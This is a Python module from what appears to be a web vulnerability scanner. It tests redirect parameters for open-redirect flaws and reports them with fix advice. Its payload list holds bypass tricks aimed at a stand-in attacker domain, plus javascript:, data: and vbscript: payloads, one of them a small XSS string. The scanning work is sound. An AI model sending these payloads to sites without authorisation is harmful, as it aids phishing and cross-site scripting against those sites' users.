"""
modules/redirects.py — Open redirect avanzado.

Cubre múltiples técnicas de bypass:
  - Esquemas dangerous: data:, javascript:, vbscript:, file:
  - Protocol-relative: //evil.com
  - Userinfo trick: https://victim.com@evil.com
  - Fragment trick: https://victim.com#@evil.com
  - Backslash variants: https:\\\\evil.com (algunos parsers lo aceptan)
  - IDN homograph: hxxps://evіl.com (cyrillic 'і')
  - Whitespace injection: https:/%09/evil.com
  - Trailing chars: https://evil.com%2F, %23, %3F
  - Encoded: %2f%2fevil.com
"""

from __future__ import annotations

import asyncio
import urllib.parse
from urllib.parse import urlparse, quote

from utils.http import AsyncHTTPClient
from utils.vuln import Vuln, make_vuln
from config import REDIRECT_PARAMS


_ATTACKER_DOMAIN = "evil.attacker-test.com"

# Cada entrada: (payload, technique_name, severity_bump)
_PAYLOAD_VARIANTS = [
    (f"https://{_ATTACKER_DOMAIN}",                "Direct URL",             0),
    (f"//{_ATTACKER_DOMAIN}",                       "Protocol-relative",      0),
    (f"https:/{_ATTACKER_DOMAIN}",                  "Single slash",           0),
    (f"https://{_ATTACKER_DOMAIN}%2F",              "Trailing %2F",           0),
    (f"https://{_ATTACKER_DOMAIN}%23",              "Trailing %23",           0),
    (f"https:/%09/{_ATTACKER_DOMAIN}",              "Whitespace TAB",         0),
    (f"https:%5C%5C{_ATTACKER_DOMAIN}",             "Backslash %5C",          0),
    # Userinfo trick (peligrosa: parsers viejos pueden interpretar mal)
    (f"https://VICTIM.com@{_ATTACKER_DOMAIN}",       "Userinfo bypass",       0),
    (f"https://VICTIM.com%23@{_ATTACKER_DOMAIN}",    "Fragment+userinfo",     0),
    # Dangerous schemes
    ("javascript:alert(1)",                          "javascript: scheme",    1),
    ("data:text/html,<script>alert(1)</script>",     "data: scheme",          1),
    ("vbscript:msgbox(1)",                           "vbscript: scheme",      1),
]


async def run(client: AsyncHTTPClient, url: str) -> list[Vuln]:
    vulns: list[Vuln] = []
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    found_params: set[str] = set()

    async def test_param(param: str):
        for payload, technique, sev_bump in _PAYLOAD_VARIANTS:
            if param in found_params:
                return

            # Construir URL substituyendo VICTIM por el host del target
            actual_payload = payload.replace("VICTIM.com", parsed.hostname or "victim.com")
            test_url = f"{base}/?{param}={quote(actual_payload, safe=':/@.%')}"

            resp = await client.get(test_url, follow=False, lax_ssl=True)
            if not resp:
                continue

            loc = resp.headers.get("location", "")
            loc_lower = loc.lower()

            # Confirmar que el redirect lleva al attacker
            is_redirected = resp.status in (301, 302, 303, 307, 308)
            attacker_in_loc = (
                _ATTACKER_DOMAIN in loc_lower
                or actual_payload.lower() in loc_lower
                or (technique.endswith("scheme") and actual_payload.split(":")[0] in loc_lower[:30])
            )

            if is_redirected and attacker_in_loc:
                found_params.add(param)

                # Severity escalada para schemes dangerous
                sev   = "CRITICAL" if sev_bump > 0 else "HIGH"
                cvss  = 9.0 if sev_bump > 0 else 7.4

                vulns.append(make_vuln(
                    title       = f"Open Redirect en '{param}' — {technique}",
                    severity    = sev,
                    cvss        = cvss,
                    category    = "Open Redirect",
                    description = (
                        f"El parámetro '{param}' redirige a URL externa arbitraria "
                        f"usando técnica: {technique}. "
                        + ("Schemes dangerous (javascript:, data:) permiten XSS directo." if sev_bump > 0
                           else "Útil para phishing con dominio confiable en la URL inicial.")
                    ),
                    evidence    = (
                        f"GET /?{param}={actual_payload[:80]}\n"
                        f"→ HTTP {resp.status} Location: {loc[:200]}\n"
                        f"Técnica: {technique}"
                    ),
                    fix         = (
                        f"Validar que '{param}' solo redirige a URLs cuyo HOSTNAME esté en "
                        "una whitelist exacta. NO usar startswith(domain) — vulnerable a userinfo. "
                        "Parsear con urllib.parse y validar parsed.netloc exactamente. "
                        "Rechazar schemes != http/https."
                    ),
                    ref         = "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                    module      = "redirects",
                    url         = test_url,
                    cwe         = "CWE-601",
                ))
                return

    await asyncio.gather(*[test_param(p) for p in REDIRECT_PARAMS])
    return vulns
